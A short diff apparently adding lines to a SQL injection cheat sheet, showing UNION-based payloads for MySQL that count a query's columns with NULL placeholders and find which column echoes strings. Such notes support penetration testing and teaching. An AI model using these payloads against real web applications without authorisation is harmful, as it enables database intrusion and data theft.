@@ -21,3 +21,7 @@ Determine the number of columns returned by the select statement:
 (Keep adding numbers to the select statement until you get results back)
 MySQL:    route?<key1>=<val1>' union select 1,2,3 --
 
+Use null vals:
+MySQL:    route?<key1>=<val1>' union select null,null,null--
+You can iterate over the columns to see which one lets you print strings, etc.
+E.g.,     route?<key1>=<val1>' union select null,'string',null--
